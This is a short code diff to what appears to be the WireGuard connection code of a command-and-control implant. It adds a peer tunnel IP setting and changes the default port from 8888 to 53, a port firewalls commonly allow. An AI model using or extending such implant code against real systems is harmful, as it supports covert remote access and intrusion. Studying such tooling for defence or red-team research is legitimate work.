@@ -55,6 +55,7 @@ var (
 	caCertPEM        = `{{.Config.CACert}}`
 	wgImplantPrivKey = `{{.Config.WGImplantPrivKey}}`
 	wgServerPubKey   = `{{.Config.WGServerPubKey}}`
+	wgPeerTunIP      = `{{.Config.WGPeerTunIP}}`
 
 	readBufSize       = 16 * 1024 // 16kb
 	maxErrors         = getMaxConnectionErrors()
@@ -382,7 +383,7 @@ func wgConnect(uri *url.URL) (*Connection, error) {
 	// {{end}}
 	lport, err := strconv.Atoi(uri.Port())
 	if err != nil {
-		lport = 8888
+		lport = 53
 	}
 	conn, dev, err := wgSocketConnect(uri.Hostname(), uint16(lport))
 	if err != nil {
